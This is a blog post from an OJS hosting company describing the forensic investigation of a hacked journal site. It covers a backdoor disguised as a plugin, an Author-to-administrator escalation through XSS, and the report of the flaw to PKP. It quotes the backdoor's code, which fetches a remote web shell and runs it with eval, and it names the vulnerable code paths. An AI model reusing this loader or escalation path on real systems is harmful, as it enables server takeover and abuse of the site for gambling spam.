## Background

As the trend of gambling sites (judol) emerge, so this kind of site relies on the backlink to their site. By utilizing the backlink from reputable sites, the site will benefit from higher ranking and credibility by Search Engine.

In our hosting infrastructure, we have been trusted by hundreds of clients globally and have [providing support](https://openjournaltheme.com/ojs-support-services) to numerous reputable OJS client that have high indexing in Scopus and WOS.

One of our customers informed us that their OJS become slow and in the early morning we also get notification from Google Search Console that there is a new sitemap modification to the account of the user.

After investigating the server through the analysis of the various log in our server we found that the root cause of this penetration server is caused by the OJS. Unfortulantely, this security issue categorized as Zero day vulnerability which mean that it is unknown by PKP itself until we have reported it to them.

At the time we discovered the issue, we were trying to find is there any public disclosure by PKP regarding their software OJS as we found out that our client has use that OJS version is that claimed by the PKP that  have no security issue : <https://pkp.sfu.ca/software/ojs/download/archive/>

If you are using the version below 3.3.0.13, you also need to read this article :
<https://openjournaltheme.com/critical-vulnerabilities-on-ojs-3-2-3-3-version3/>

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image.png)

The worst part of this vulnerability allow hacker to take control of the server, add cloaked gambling site to the OJS that is seem unaware by the user of OJS but will be used by the search engine. This vulnerability will turn your domain without user aware to a gambling site.

## How we found the vulnerabilities

Althought the version that is used by the client did not have known security issue as claimed by PKP, we still curious about the root cause.

We always focus on **finding the root cause** of server penetration rather than directly fixing the issue. This action is the most important thing to be done because although you finish fixing the issue in the first place from the hacked activity without knowing the root cause of how they can gain access to your system, note my word that the hacker will be back in a short time.

After doing more a more analysis of the various logs in the server including *auth.log* and more log we found the interesting part in the log :

[![anjeyhecker how to fix in OJS](data:image/svg+xml...)![anjeyhecker how to fix in OJS](https://openjournaltheme.com/wp-content/uploads/2024/10/image-1.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-1.png)

30 Juni 2022 Log : **Anjay Hengker**, a backdoor that is masked as generic plugin uploaded by hacker

Our team intensively eager to known based on that log

The file integrity monitoring that we have in our server also report this new file :

```
{
  "user": "www-data",
  "group": "www-data",
  "rights": "0644",
  "path": "/var/www/ojs_files/temp/txtGdewbY",
  "malware_name": "{SA-MD5}PHP.Backdoor.rmlJZ9",
  "size": 684842,
  "created": "2024-06-26 06:02:22",
  "signatureId": "6555afe6e8e22b95830ac20d"
}

```

Later after we checking the new file in linux using this command :

```
find /path/to/dir1 /path/to/dir2 -type f -print0 | xargs -0 ls -lt | head -n 100
```

We found that there is a suspicious new file :
– **as.php**
– **img.png** (image to show the evidence of successful hack result by the hacker)

The **as.php** file actually a new file that is uploaded by hackers as a plugin in the OJS.  After the file was uploaded, the hacker now can access directly the file using direct path in the browser, using this URL as example :

yourdomain.com/plugins/generic/anjayhengker/locale/as.php

After we reviewed the source code of **as.php** file we found that the file is used for accessing the server through SSH by using the **Netcat** access. So the hacker can connect to the server using command execution even previously the server is already configured and can only be accessed using console by using the VPN.

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-2.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-2.png)

Content of the file as.php

```
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/nicxlau/alfa-shell/master/alfa-obfuscated.php');
    eval('?>' . $a);
    }
```

The above code retrieves content from the specified URL, which contains source code (exploit). Once the content is successfully obtained, it is immediately executed using the eval function.

Note that the hacker have the capability as the administrator in OJS so he can upload the file. This is the real cause that need us to convey.

The only clue that we have is the **`access_log`** in the web server.

## How Hacker can escalate its roles as administrator :

The file change or creation that we have created in our hosting service (we call it OJT Guardian)  is very useful for us as it provides a first track of the file created by the hacker :

As we aware that the file was uploaded in 30 Jun 2024, that is our first finger print information about this digital forensic activity .

By analyzing the Jun 30 log, we found very **suspicious activity**

Here is the log

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-1.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-1.png)

See the IP from that is 123.231.236.242 on 02:35:59

**That is our first clue** 🥁

By scrolling to the upper side of the log, we found that the fact that user actually has credential to log in to the site but in this case, the hacker does not have a role as administrator :

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-3.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-3.png)

After more investigation, the hacker has successfully obtained access as the journal manager. As you can see on the above log, the user can log in with the correct credentials and access the index page in the back-end of OJS.

I just want to let you know that, no attempt of password guessing here or **bruteforce** attack. The hacker flawlessly logs in with the correct credentials to the OJS as a legitimated user in the system.

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-4.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-4.png)

Let’s observe this log, on 02:24:19 the JM roles smoothly change its roles without any illegal or suspicious attempt. It just doing regular activity based on the log and after that, this actor uploads a new plugin to benefit of his role as administrator of OJS.

### Even as a simply as Author roles can exploit this vulnerability.

After digging to more of the OJS native source code, we found that even as an author, that role can escalate his role to become as administrator.

Using a combination of **CVE-2024-25434**,**2024-25436**, **CVE-2024-25438**, and our newly found Zero-day CVE, the author can add an XSS code to the affiliation data and submit a fake / dummy article.

When the editor click the submission, without the awareness of the editor / other upper level, the author will turn himself to become an administrator on that journal.

This is possible because of this code :
`/lib/pkp/controllers/grid/settings/user/form/UserForm.inc.php`

In this line of code :
`$userGroupDao->assignUserToGroup($this->userId, $userGroupId);`

Then author attach an XSS script in the description field in their profile edit :

`lib/pkp/controllers/grid/users/author/form/PKPAuthorForm.inc.php` In the `function execute`

```
$author->setPreferredPublicName($this->getData('preferredPublicName'), null);
```

This kind of issue is **unknown by the PKP**, so later in this section, we have reported this as a form of our contribution to OJS community. Please take a look at the security vulnerability that is unknown by the developer, it is called Zero Day vulnerability.

## Meet the Zero day vulnerabilities

A zero-day vulnerability refers to a security flaw in software or hardware that is unknown to the party responsible for patching or fixing the issue. Because it is unknown, there is no existing patch or fix at the time it is discovered. The term “zero-day” comes from the fact that the vulnerability is discovered by attackers before or on the same day that the developers become aware of it, giving them “zero days” to address the problem.

### Impact of the hacked OJS/OMP/OPS

Why an urgent action needed for any issue that is related to OJS/OMP?

As OJS is use for scientific publication of journal, the hacker can abuse this site to do this following activities :

1. Add illegal blacklink to porn or gambling site by using cloaked technique
2. Remove your site from the Google Scholar and other reputable indexing because your domain now is a host of gambling site.
3. Slower because the hacker can add cryptocurrency or software keylogger to your OJS server and OJS app
4. Hacker can steal any user username and password and use it else where that will threaten the privacy of the user in your OJS/OMP.

See this below image as the hacker use the sitemap to claim the site ownership to him.

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-5.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-5.png)

After the hacker claim the ownership of the domain in the Google Search console, the hacker will add sitemap that will illegally promote the gambling site to the Google Search Engine

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-6.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-6.png)[![ojs get malware notification ](data:image/svg+xml...)![ojs get malware notification ](https://openjournaltheme.com/wp-content/uploads/2024/10/image-10.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-10.png)

Your site can be blocked by Google Chrome and other browser because of it is indicated it getting hacked.

If you think that your journal is currently safe …. wait…

**Did you know the worst part of this hacker activity?**

The human visitor **won’t see the cloaked backlink as the browser only processes visual code to be presented to its user**, but it benefits the search engine as the search engine will compile all the code on the page including some information that is based on the code displayed as none. For example on the above search result from Google, the page has been injected with a clocked gambling site.

So after the hacker introduces a new sitemap to google the network of search engines will also update their link database that is acknowledged to exist (by using that sitemap) so not only Google, Bing, Yandex, Baiduu and other search engines will recognize now that the journal site becomes a partner for a gambling site.

The journal manager or editor isn’t aware that the site already getting hacked. As they are aware that there is a strange issue with their site it may become too late and it has a big probability of getting **blocked by Google Scholar forever!**

Cloaked site in the OJS based site that can only be shown when the `view-source` of the page is activated.

### Reporting the Zero Day vulnerabilities to PKP

As soon as our expert team positively confirmed the cause of this issue by the vulnerable code (Zero-day vulnerability) in OJS/OMP/OPS and it is unknown by PKP, we contacted the PKP team (Alec) through email and informed them about the issue. We appreciate the fast response from the PKP team for fixing the problem by replying to our report and later releasing a new OJS version that fixes that critical issue.

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-7.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-7.png)[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-8.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-8.png)

After we have reported it, the new version of OJS 3.3.0.18 that fix that vulnerabilities have been released.

## Informing the threat internally to all of our customers

We have patched as soon as we recognized this vulnerability to all of our hosting and clients that use our support package without the need to inform them about this vulnerability. So they get the latest patch from our internal team as a priority.

To make this **critical vulnerability private**, we broadcast this information to the valuable customer client only as soon as we found this vital issue (in July 2024). This is to consider that in the past we have informed such urgent security issues to all our subscriber users, but without our consent, one of our receivers forwarded the sensitive information to the forum or sent this sensitive information to PKP and later we got a warning from PKP about those.

After that, we learned our lesson to keep this private while waiting for the time range as requested by PKP to disclose the finding.

After considering our decision, we sent an urgent message to our customer internally in July and of course, patched on early to all our hosting client and clients that hire us to provide them with exclusive support.

[![](data:image/svg+xml...)![](https://openjournaltheme.com/wp-content/uploads/2024/10/image-9.png)](https://openjournaltheme.com/wp-content/uploads/2024/10/image-9.png)

**Here is our message to all of our customer**

| Greetings to OJS users,This past few week, several of our clients have complained that their OJS has fallen victim to the JUDOL hack or become gambling site. After we carried out an analysis using various logs on the server and searching the OJS code, it turned out that this was because hackers had managed to access OJS as an administrator by exploiting several Zero Day security vulnerabilities that we discovered (we have not yet published the details – we are currently carrying out an internal communication process with PKP).Where hackers can get access to the journal manager even as an administrator ONLY by registering as an author on your OJS.Apart from that, CRITICAL vulnerabilities are also found in the following reports1. CVE-2024-25438 (2024-03-01)2. CVE-2024-25436 (2024-03-01)3. CVE-2024-25434 (2024-03-01)4. CVE-2024-24512 (2024-03-01)5. PKP-WAL 3.4.0-3 Remote Code Execution (2023-12-04)6. CVE-2024-24511 (2024-02-01)7. **Zero Day vulnerabilities by OJT Team (4 July 2024)** – undisclosed publicly.**What is the impact of this vulnerability?**This vulnerability allows hackers to act as administrators. Initially, the hacker will upload a plugin which is a backdoor, and after that they will be able to take full control of the server including the threat of deleting the entire database, adding your site to search engines as a site that directs to the Judol site, deleting or modifying files in your OJS. You may not be aware of adding a Judol site link to your journal and it will not be visible in the journal but will be detected in Google results. As a result, your site is considered by Google as a hacked site and has the potential to be blocked from Google Scholar or other indexing.**What steps should be taken?**Maybe simply, by your provider, you will be advised to upgrade OJS. Initially at an internal meeting of the OJT team, we also thought the same way.However, after we consider it more carefully, we will decide not to upgrade. Apart from that, we also do not recommend upgrading to the OJS 3.4 version, this is because in the latest OJS or OJS 3.4 latest there are still several bugs which will cause difficulties for journal users in carrying out operations in OJS, for example there are bugs when registering DOIs and several other obstacles such as the difference in UI in 3.4 which is different from OJS 3.3Here are some bugs in OJS 3.4:1. <https://forum.pkp.sfu.ca/t/an-xml-validation-error-occurred-and-the-xml-could-not-be-exported/83334/11> (error when registering DOI)2. <https://forum.pkp.sfu.ca/t/editorial-activity-statistics-look-strange-ojs-3-4-0-4/87021/12>3. <https://openjournaltheme.com/ojs-3-4-whats-new-and-should-you-upgrade-now/>Thankfully, we have an internal team that is an expert in the OJS coding, so to help our clients, we decided to provide free patching (done independently) to repair this vulnerability.**Important**! The OJS patching document that we provide can only be implemented on OJS version 3.3. If your OJS version is below version 3.3 (whether 3.2, 3.1, etc.) we recommend that you first upgrade your OJS to the latest OJS 3.3 version. Then you can apply the patching document that we provide.So in short what we recommend is:1. Upgrade your OJS to the latest version 3.32. Patching your OJS with the latest version 3.3 which has improved security.If you want to hand over all this work to our team, please contact us for further information.Notes: If later, you want to get other important information like this, please subscribe by adding your email to our website page<https://openjournaltheme.com/>**Affected version**: 3.1.X, 3.2.X, < 3.3.0.16 to < 3.4.0.4 All OJS/OMP/OPS users using [our support service](https://openjournaltheme.com/ojs-support-services/) and [hosting services](https://openjournaltheme.com/ojs-hosting-management) have been preemptively secured regarding the CVE and Zero Day vulnerabilities we identified.Please do not disseminate this information publicly, as it could be used by irresponsible parties to harm OJS users.The PKP team may prohibit the information we convey as they **still not releasing a patch publicly**, but we feel our customers must know as a form of our commitment to good relations with our customers**Regards,**Openjournaltheme |

If you have received this message and gently reply those message, we will consider that later we will keep inform you about an urgent information in the future.

We were happy that our communication with our client is reacted and valued with kind reply 🙂

### How to fix this newly 3.3.x and 3.4.x security issue ?

After we have check we can mention that this issue arise with combination of CVE.

So our best advice for you for this is : **upgrade your OJS** to the latest version of 3.3 or 3.4.

Although we still not recommend to upgrading your OJS to the 3.4 version tier as we have explained in this article :
<https://openjournaltheme.com/ojs-3-4-whats-new-and-should-you-upgrade-now/>

Upgrading to 3.3 latest version would be the safest decision

The safest versions currently that fix these issues is (minimal) 3.3.0.18 and 3.4.0.6 as both of these versions fix those CVE as we have reported.

If you don’t have resource the upgrade your OJS, you can also patch your OJS with our instructions that can be retrieved on the above message.

# Questions:

1. Our PKP Platform is using 3.1 or 3.2 is this security issue affected? **Yes**, in fact, you may even affected by multiple security issues other than this as we have explained here [URGENT OJS 3.X Security Issue!](https://openjournaltheme.com/urgent-ojs-3-x-security-issue/)
2. Should I upgrade to 3.4 or use 3.3.x latest version ? We **recommend** using 3.3 latest version as it is Long Term Support (LTS) version.
